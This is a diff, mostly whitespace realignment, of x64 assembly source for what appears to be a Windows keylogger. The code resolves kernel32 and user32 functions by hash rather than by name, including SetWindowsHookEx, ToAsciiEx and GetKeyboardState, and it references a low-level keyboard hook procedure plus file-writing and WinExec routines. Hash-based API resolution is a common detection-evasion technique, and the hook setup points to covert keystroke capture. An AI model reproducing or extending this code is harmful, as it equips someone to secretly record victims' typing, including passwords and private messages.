@@ -41,32 +41,31 @@ EXTERN writeTofile       : PROC
     ;--------------------------------------;
 .data?
 ;Address of library
-    k32address          QWORD ?
-    u32address          QWORD ?
-;Address of function
+    k32address              QWORD ?
+    u32address              QWORD ?
 ;k32 functions
-    loadlibrary         QWORD ?
-    createfile          QWORD ?
-    writefile           QWORD ?
-    getmodulehandle     QWORD ?
-    closehandle         QWORD ?
-    winexec             QWORD ?
+    loadlibrary             QWORD ?
+    createfile              QWORD ?
+    writefile               QWORD ?
+    getmodulehandle         QWORD ?
+    closehandle             QWORD ?
+    winexec                 QWORD ?
 ;u32 functions
-    setwindowhookex     QWORD ?
-    callnexthook        QWORD ?
-    toasciiex           QWORD ?
-    getkeyboardlayout   QWORD ?
-    getkeystate         QWORD ?
-    getkeyboardstate    QWORD ?
-    getmessage          QWORD ?
+    setwindowhookex         QWORD ?
+    callnexthook            QWORD ?
+    toasciiex               QWORD ?
+    getkeyboardlayout       QWORD ?
+    getkeystate             QWORD ?
+    getkeyboardstate        QWORD ?
+    getmessage              QWORD ?
 ;other uninitialized variables
-    wparam              QWORD ?
-    lparam              QWORD ?
-    vk_code             DWORD ?
-    callcode            DWORD ?
-    vk_scanCode         DWORD ?
-    keyBoardHL          DWORD ?
-    hfile               QWORD ?
+    wparam                  QWORD ?
+    lparam                  QWORD ?
+    vk_code                 DWORD ?
+    callcode                DWORD ?
+    vk_scanCode             DWORD ?
+    keyBoardHL              DWORD ?
+    hfile                   QWORD ?
     ;-----------------------------------------;
 
 .code
@@ -151,60 +150,60 @@ lowlevelkeyboard ENDP
 
 
 main proc
-    push rbp                                    ; save rbp, +8B into the stack (i mustn't forget 16 bit stack alignment)
-    mov rbp,rsp                                 ; new rpb
-    sub rsp,48                                  ; create stack frame
+    push rbp                                        ; save rbp, +8B into the stack (i mustn't forget 16 bit stack alignment)
+    mov rbp,rsp                                     ; new rpb
+    sub rsp,48                                      ; create stack frame
     ;------------------------------------;
     ;   Find all the kernel32 api        ;
     ;------------------------------------;
-    call FindK32Addr                            ; get the address of the kernel32 in memory
-    mov k32address,rax                          ; save the address to the variable
-    xor r10,r10                                 ; r8=0=i (index)
+    call FindK32Addr                                ; get the address of the kernel32 in memory
+    mov k32address,rax                              ; save the address to the variable
+    xor r10,r10                                     ; r8=0=i (index)
 ciclo:
-    xor rcx,rcx                                 ; rcx=0
-    xor rdx,rdx                                 ; rdx=0
-    xor rbx,rbx                                 ; rbx=0
-    xor rax,rax                                 ; rax=0
-    xor r9,r9                                   ; r9=0
-    mov r9,6                                    ; r9=6=number of hash to resolve
-    cmp r10,r9                                  ; compare index to i
-    je next_step                                ; if i < (number of hash) compute else finish
-    mov rcx,offset LOADLIBRARYH                 ; get the address of the first hash
-    mov eax,dword ptr[rcx+(r10*4)]              ; eax = *(dword32*)((address of hash)+(i*4))
-    mov rdx,rax                                 ; second argument hash to resolve
-    mov rcx,k32address                          ; library where the function is stored
-    call HashResolver                           ; resolve the address
-    mov rbx,offset loadlibrary                  ; get the first slot of symbol table, that it will hold the api address
-    mov qword ptr[rbx+r10*8], rax               ; save the address
-    inc r10                                     ; i++
-    jmp ciclo                                   ; repeat
+    xor rcx,rcx                                     ; rcx=0
+    xor rdx,rdx                                     ; rdx=0
+    xor rbx,rbx                                     ; rbx=0
+    xor rax,rax                                     ; rax=0
+    xor r9,r9                                       ; r9=0
+    mov r9,6                                        ; r9=6=number of hash to resolve
+    cmp r10,r9                                      ; compare index to i
+    je next_step                                    ; if i < (number of hash) compute else finish
+    mov rcx,offset LOADLIBRARYH                     ; get the address of the first hash
+    mov eax,dword ptr[rcx+(r10*4)]                  ; eax = *(dword32*)((address of hash)+(i*4))
+    mov rdx,rax                                     ; second argument hash to resolve
+    mov rcx,k32address                              ; library where the function is stored
+    call HashResolver                               ; resolve the address
+    mov rbx,offset loadlibrary                      ; get the first slot of symbol table, that it will hold the api address
+    mov qword ptr[rbx+r10*8], rax                   ; save the address
+    inc r10                                         ; i++
+    jmp ciclo                                       ; repeat
     ;------------------------------------;
     ;   Find all the user32 api          ;
     ;------------------------------------;
 next_step:
-    xor rcx,rcx                                 ; rcx=0
-    mov rcx,offset u32str                       ; rcx = u32 address string
-    call qword ptr[loadlibrary]                 ; loadlibrary("user32.dll")
-    mov u32address,rax                          ; save the address
-    xor r10,r10                                 ; r10=0=i (index)
+    xor rcx,rcx                                     ; rcx=0
+    mov rcx,offset u32str                           ; rcx = u32 address string
+    call qword ptr[loadlibrary]                     ; loadlibrary("user32.dll")
+    mov u32address,rax                              ; save the address
+    xor r10,r10                                     ; r10=0=i (index)
 ciclo2:
-    xor rcx,rcx                                 ; rcx=0
-    xor rdx,rdx                                 ; rdx=0
-    xor rbx,rbx                                 ; rbx=0
-    xor rax,rax                                 ; rax=0
-    xor r9,r9                                   ; r9=0
-    mov r9,7                                    ; r9=12=number of hash to resolve
-    cmp r10,r9                                  ; compare index to i
-    je entry                                    ; if i < (number of hash) compute else finish
-    mov rcx,offset SETWINDOWSHOOKEXH            ; get the address of the first hash
-    mov eax,dword ptr[rcx+(r10*4)]              ; eax = *(dword32*)((address of hash)+(i*4))
-    mov rdx,rax                                 ; second argument hash to resolve
-    mov rcx,u32address                          ; library where the function is stored
-    call HashResolver                           ; resolve the address
-    mov rbx,offset setwindowhookex              ; get the first slot of symbol table, that it will hold the api address
-    mov qword ptr[rbx+r10*8], rax               ; save the address
-    inc r10                                     ; i++
-    jmp ciclo2                                  ; repeat
+    xor rcx,rcx                                     ; rcx=0
+    xor rdx,rdx                                     ; rdx=0
+    xor rbx,rbx                                     ; rbx=0
+    xor rax,rax                                     ; rax=0
+    xor r9,r9                                       ; r9=0
+    mov r9,7                                        ; r9=12=number of hash to resolve
+    cmp r10,r9                                      ; compare index to i
+    je entry                                        ; if i < (number of hash) compute else finish
+    mov rcx,offset SETWINDOWSHOOKEXH                ; get the address of the first hash
+    mov eax,dword ptr[rcx+(r10*4)]                  ; eax = *(dword32*)((address of hash)+(i*4))
+    mov rdx,rax                                     ; second argument hash to resolve
+    mov rcx,u32address                              ; library where the function is stored
+    call HashResolver                               ; resolve the address
+    mov rbx,offset setwindowhookex                  ; get the first slot of symbol table, that it will hold the api address
+    mov qword ptr[rbx+r10*8], rax                   ; save the address
+    inc r10                                         ; i++
+    jmp ciclo2                                      ; repeat
 
 entry:
     ;-----------------------------------;
